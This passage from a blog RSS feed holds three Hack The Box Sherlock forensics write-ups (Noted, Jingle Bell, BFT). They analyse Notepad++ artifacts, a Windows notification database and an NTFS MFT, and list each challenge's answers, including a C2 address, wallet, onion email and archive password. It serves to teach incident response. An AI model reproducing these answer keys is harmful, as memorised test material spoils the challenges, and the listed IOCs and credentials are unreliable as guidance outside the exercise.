<p>Simon, a developer working at Forela, notified the CERT team about a note that appeared on his desktop. The note claimed that his system had been compromised and that sensitive data from Simon&rsquo;s workstation had been collected. The perpetrators performed data extortion on his workstation and are now threatening to release the data on the dark web unless their demands are met. Simon&rsquo;s workstation contained multiple sensitive files, including planned software projects, internal development plans, and application codebases. The threat intelligence team believes that the threat actor made some mistakes, but they have not found any way to contact the threat actors. The company&rsquo;s stakeholders are insisting that this incident be resolved and all sensitive data be recovered. They demand that under no circumstances should the data be leaked. As our junior security analyst, you have been assigned a specific type of DFIR (Digital Forensics and Incident Response) investigation in this case. The CERT lead, after triaging the workstation, has provided you with only the Notepad++ artifacts, suspecting that the attacker created the extortion note and conducted other activities with hands-on keyboard access. Your duty is to determine how the attack occurred and find a way to contact the threat actors, as they accidentally locked out their own contact information.</p>
<h3 id="forensics">Forensics</h3>
<ul>
<li>
<p><strong>Artifacts</strong>: The artifacts are from <code>Notepad++</code> software. We have two XML files named <code>config.xml</code> and <code>session.xml</code>. We are also provided with two backup files of two text files <code>LootAndPurge.java@2023-07-24_145332</code> and <code>YOU HAVE BEEN HACKED.txt@2023-07-24_150548</code>.</p>
</li>
<li>
<p><strong>Extraction</strong>: The files were all in plaintext format and the volume of data was low, so extraction was not necessary. However, five files were created for classification purposes. They are <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/file_history.txt">file history of recently opened files</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/edited_files.txt">edited files in the alleged Notepad++</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/custom_uris.txt">custom URIs the alleged Notepad++ was set to handle</a>, <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/LootAndPurge.java">malicious data extortion java file</a> and <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/YOU%20HAVE%20BEEN%20HACKED.txt">a ransom note file</a></p>
</li>
<li>
<p><strong>Analysis</strong>:</p>
<p>First, I examined the <code>config.xml</code> file and found some file histories. The history contained the file addresses that were recently opened by the user. I have listed them in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/file_history.txt"><code>file_history.txt</code></a> file. Also, I found some custom URIs that were set to handle files from different types of services. They are listed in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/custom_uris.txt"><code>custom_uris.txt</code></a> file.</p>
<p>Second, I analyzed the <code>session.xml</code> file and there I found two files that were being edited along with their backup file locations and last modified timestamps. I added them to a file named <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/edited_files.txt"><code>edited_files.txt</code></a> with the findings.</p>
<p>Finally, I inspected the backup files and discovered a malicious <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/LootAndPurge.java">Java source file</a>(LootAndPurge.java) that was used to encrypt the sensitive data and a <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/YOU%20HAVE%20BEEN%20HACKED.txt">ransom note</a> where two <code>Pastebin</code> links were given to contact the cybercriminals. A password for the zip file was left behind by the perpetrators. Which can be used to decrypt the content of the zip file. The same password can be used to decrypt the <code>Pastebin</code> notes to find their Ethereum wallet address and email address.</p>
</li>
</ul>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li>Visual Studio Code</li>
<li>Python3</li>
</ul>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q1: What is the full path of the script used by Simon for AWS operations?</p>
<ul>
<li>A: <code>C:\Users\Simon.stark\Documents\Dev_Ops\AWS_objects migration.pl</code></li>
</ul>
</li>
<li>
<p>Q2: The attacker duplicated some program code and compiled it on the system, knowing that the victim was a software engineer and had all the necessary utilities. They did this to blend into the environment and didn&rsquo;t bring any of their tools. This code gathered sensitive data and prepared it for exfiltration. What is the full path of the program&rsquo;s source file?</p>
<ul>
<li>A: <code>C:\Users\simon.stark\Desktop\LootAndPurge.java</code>.</li>
</ul>
</li>
<li>
<p>Q3: What&rsquo;s the name of the final archive file containing all the data to be exfiltrated?</p>
<ul>
<li>A: <code>Forela-Dev-Data.zip</code></li>
</ul>
</li>
<li>
<p>Q4: What&rsquo;s the timestamp in UTC when attacker last modified the program source file?</p>
<ul>
<li>A: <code>2023-07-24 09:53:23</code></li>
</ul>
</li>
<li>
<p>Q5: The attacker wrote a data extortion note after exfiltrating data. What is the crypto wallet address to which attackers demanded payment?</p>
<ul>
<li>A: <code>0xca8fa8f0b631ecdb18cda619c4fc9d197c8affca</code></li>
</ul>
</li>
<li>
<p>Q6: What&rsquo;s the email address of the person to contact for support?</p>
<ul>
<li>A: <code>CyberJunkie@mail2torjgmxgexntbrmhvgluavhj7ouul5yar6ylbvjkxwqf6ixkwyd.onion</code></li>
</ul>
</li>
</ul>
<h3 id="summary">Summary</h3>
<p>Using the artifacts provided I was able to answer the questions. It was pretty straightforward. But answering Question 4 was a little bit baffling to me. It was related to Windows&rsquo;s FileTime System. I did a little bit of research and piece together an article that you can read <a href="https://hshakilst.github.io/posts/filetime/">here (FileTime)</a>. Also, I added a <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Noted/convert_splitted_filetime.py">Python script</a> to convert it into UTC.</p>
]]></description></item><item><title>HTB Sherlock Jingle Bell</title><link>https://hshakilst.github.io/posts/htb-sherlocks/jingle-bell/</link><pubDate>Thu, 16 May 2024 12:54:17 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/jingle-bell/</guid><description><![CDATA[<h1 id="jingle-bell-dfir">Jingle Bell (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>Torrin is suspected to be an insider threat in Forela. He is believed to have leaked some data and removed certain applications from their workstation. They managed to bypass some controls and installed unauthorized software. Despite the forensic team&rsquo;s efforts, no evidence of data leakage was found. As a senior incident responder, you have been tasked with investigating the incident to determine the conversation between the two parties involved.</p>
<h3 id="forensics">Forensics</h3>
<p>We are given a Windows push notification database file named <code>wpndatabase.db</code>. We can learn more about this database file on:</p>
<ul>
<li><a href="https://www.mdpi.com/2673-6756/2/1/7">A Digital Forensic View of Windows 10 Notifications</a></li>
<li><a href="https://tzworks.com/prototypes/wpn/wpn.users.guide.pdf">Windows Push Notification (wpn) Database Parser Users Guide by TZWorksÂ®</a></li>
</ul>
<p>From reading these articles we discovered that in that db file, there&rsquo;s a table named <code>Notification</code>. It contains the information of the notifications shown by Windows&rsquo;s Notification Manager as <code>XML</code> payload.</p>
<p>Therefore, we used <code>sqlitebrowser</code> and manually dumped the <code>XML</code> data from the <code>Notification</code> table. And saved them in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Jingle%20Bell/notifications.xml">notifications.xml</a> file.</p>
<p>We need to analyze this XML file to answer the following questions.</p>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q: Which software/application did Torrin use to leak Forela&rsquo;s secrets?</p>
<ul>
<li>A: Torrin used <code>Slack</code> to leak the secrets. We know this from the notification&rsquo;s <code>&lt;toast launch=&quot;&quot;&gt;</code> section.</li>
</ul>
</li>
<li>
<p>Q: What&rsquo;s the name of the rival company to which Torrin leaked the data?</p>
<ul>
<li>A: The rival company&rsquo;s name is <code>PrimeTech Innovations</code>. We got this information from <code>&lt;header title=&quot;&quot;&gt;</code> section of the notification.</li>
</ul>
</li>
<li>
<p>Q: What is the username of the person from the competitor organization whom Torrin shared information with?</p>
<ul>
<li>A: The username is <code>Cyberjunkie-PrimeTechDev</code>. We get this answer from <code>&lt;binding&gt;</code>&rsquo;s second <code>&lt;text&gt;</code> tag where the attribute <code>hint-style=&quot;bodySubtle&quot;</code> exists.</li>
</ul>
</li>
<li>
<p>Q: What&rsquo;s the channel name in which they conversed with each other?</p>
<ul>
<li>A: The channel name is <code>forela-secrets-leak</code>. We can derive this from <code>&lt;binding&gt;</code>&rsquo;s first <code>&lt;text&gt;</code> tag where the attribute <code>hint-maxLines=&quot;1&quot;</code> exists.</li>
</ul>
</li>
<li>
<p>Q: What was the password for the archive server?</p>
<ul>
<li>A: The password for the archive server is <code>Tobdaf8Qip$re@1</code>. We get this from reading the body of a notification.</li>
</ul>
</li>
<li>
<p>Q: What was the URL provided to Torrin to upload stolen data to?</p>
<ul>
<li>A: The URL is <code>https://drive.google.com/drive/folders/1vW97VBmxDZUIEuEUG64g5DLZvFP-Pdll?usp=sharing</code>.</li>
</ul>
</li>
<li>
<p>Q: When was the above link shared with Torrin?</p>
<ul>
<li>A: When answering this question we faced some difficulties. Two timestamps could be the answer to the question. Firstly, the <code>Notification</code> table has an <code>ArrivalTime</code> timestamp expressed in <code>Microsoft Filetime 64-bit</code> format. When converted to date it gave <code>GMT Thu Apr 20 2023 10:36:08</code>. But it wasn&rsquo;t the answer. Secondly, there was another timestamp embedded inside the <code>&lt;toast launch=&quot;slack://channel?id=C05451QSQM8&amp;amp;message=1681986889.660179&amp;amp;team=T054518ADUJ&amp;amp;origin=notification&quot;&gt;</code> tag of the notification&rsquo;s XML structure. The <code>message=1681986889.660179</code> converts to <code>GMT Thu Apr 20 2023 10:34:49</code>. Turns out the latter one was the correct one. So, the answer is <code>2023-04-20 10:34:49</code>.</li>
</ul>
</li>
<li>
<p>Q: For how much money did Torrin leak Forela&rsquo;s secrets?</p>
<ul>
<li>A: The answer is <code>Â£10000</code>. We could find it in the <a href="https://github.com/hshakilst/DFIR/blob/main/HTB%20Sherlocks/Jingle%20Bell/notifications.xml">notifications.xml</a> file.</li>
</ul>
</li>
</ul>
]]></description></item><item><title>HTB Sherlock BFT</title><link>https://hshakilst.github.io/posts/htb-sherlocks/bft/</link><pubDate>Thu, 16 May 2024 12:44:59 +0200</pubDate><guid>https://hshakilst.github.io/posts/htb-sherlocks/bft/</guid><description><![CDATA[<h1 id="bft-dfir">BFT (DFIR)</h1>
<h3 id="scenario">Scenario</h3>
<p>In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity. During our analysis, you will utilize the MFTECmd tool to parse the provided MFT file, TimeLine Explorer to open and analyze the results from the parsed MFT, and a Hex editor to recover file contents from the MFT.</p>
<h3 id="forensics">Forensics</h3>
<ul>
<li><strong>Artifact</strong>: An MFT file <code>$MFT</code> is provided. It&rsquo;s an NTFS file system&rsquo;s master file table. <a href="https://hshakilst.github.io/posts/master-file-table/">Learn more about MFT here</a>.</li>
<li><strong>Extraction</strong>: I used <code>MFTECmd</code> to extract the contents of it and saved it to a file in CSV format.</li>
<li><strong>Analysis</strong>: <code>Timeline Explorer</code> and <code>010Editor</code> were used to answer the questions.</li>
</ul>
<h3 id="tools-used">Tools Used</h3>
<ul>
<li><a href="https://github.com/EricZimmerman/MFTECmd">MFTECmd by Eric Zimmerman</a></li>
<li><a href="https://ericzimmerman.github.io/#!index.md">Timeline Explorer</a></li>
<li><a href="https://www.sweetscape.com/download/010editor/">010Editor Hex Editor</a></li>
</ul>
<h3 id="questions-and-answers">Questions and Answers</h3>
<ul>
<li>
<p>Q1: Simon Stark was targeted by attackers on February 13. He downloaded a ZIP file from a link received in an email. What was the name of the ZIP file he downloaded from the link?</p>
<ul>
<li>A: The answer is <code>Stage-20240213T093324Z-001.zip</code>. I applied a filter on the header <code>Created0x10</code> with the date <code>2024-02-13</code> and on the header <code>Extension</code> with the value <code>.zip</code>.</li>
</ul>
</li>
<li>
<p>Q2: Examine the Zone Identifier contents for the initially downloaded ZIP file. This field reveals the HostUrl from where the file was downloaded, serving as a valuable Indicator of Compromise (IOC) in our investigation/analysis. What is the full Host URL from where this ZIP file was downloaded?</p>
<ul>
<li>
<p>A: The answer is <code>https://storage.googleapis.com/drive-bulk-export-anonymous/20240213T093324.039Z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser</code>.</p>
<p>To find the URL of the downloaded file I needed to locate the <code>Stage-20240213T093324Z-001.zip:Zone.Identifier</code> file by applying a filter on <code>Extension</code> with the value <code>.Identifier</code>. The <code>Zone.Identifier</code> file separated by a <code>:</code> after the original file is an <strong>Alternate Data Stream (ADS)</strong> file. It contains the file&rsquo;s origin Location. In this case, it was a URL. It can be found under the <code>Zone Id Contents</code> header.</p>
</li>
</ul>
</li>
<li>
<p>Q3: What is the full path and name of the malicious file that executed malicious code and connected to a C2 server?</p>
<ul>
<li>A: The answer is <code>C:\Users\simon.stark\Downloads\Stage-20240213T093324Z-001\Stage\invoice\invoices\invoice.bat</code>. The file was found by applying a filter on the header <code>Parent Path</code> with the initial zip file&rsquo;s partial name <code>Stage</code> and a suspicious <code>.bat</code> file was discovered.</li>
</ul>
</li>
<li>
<p>Q4: Analyze the $Created0x30 timestamp for the previously identified file. When was this file created on disk?</p>
<ul>
<li>A: The answer is <code>2024-02-13 16:38:39</code>. <a href="https://hshakilst.github.io/posts/master-file-table/#timestamps">Learn more about the difference between $Created0x10 and $Created0x30</a>.</li>
</ul>
</li>
<li>
<p>Q5: Finding the hex offset of an MFT record is beneficial in many investigative scenarios. Find the hex offset of the stager file from Question 3.</p>
<ul>
<li>A: The answer is <code>16E3000</code>. To find the answer I needed to look for the malicious file&rsquo;s <code>Entry Number</code> which was <code>23436</code>. Then I multiplied it with 1024 <code>23436*1024</code> because each entry in the MFT is <code>1024 bytes</code> in size. After that, I converted the Decimal number to Hex.</li>
</ul>
</li>
<li>
<p>Q6: Each MFT record is 1024 bytes in size. If a file on disk has smaller size than 1024 bytes, they can be stored directly on MFT File itself. These are called MFT Resident files. During Windows File system Investigation, its crucial to look for any malicious/suspicious files that may be resident in MFT. This way we can find contents of malicious files/scripts. Find the contents of The malicious stager identified in Question3 and answer with the C2 IP and port.</p>
<ul>
<li>
<p>A: The answer is <code>43.204.110.203:6666</code>.</p>
<p>I had the hex offset for the <code>invoice.bat</code> file&rsquo;s entry and from the <strong>Timeline Explorer</strong>, and I discovered the <code>File Size</code> was <code>286 bytes</code>. So, it can be safely assumed it is an <a href="https://hshakilst.github.io/posts/master-file-table/#mft-resident-files"><code>MFT Resident</code> file</a>. The contents of this file can be viewed using a Hex Editor.</p>
<p>I opened up my Hex Editor went to the offset <code>16E3000</code> and found the file&rsquo;s contents. It used <code>powershell</code> to download a payload from the above IP.</p>
</li>
</ul>
</li>
</ul>
<h3 id="summary">Summary</h3>
<p>Using the MFT file I was able to discover a stager file residing in MFT and the URL which was used to deliver it initially. I also discovered a C2 server by reading the contents of that file. A timeline for this incident was also established using Timeline Explorer.</p>
]]></description></item></channel></rss>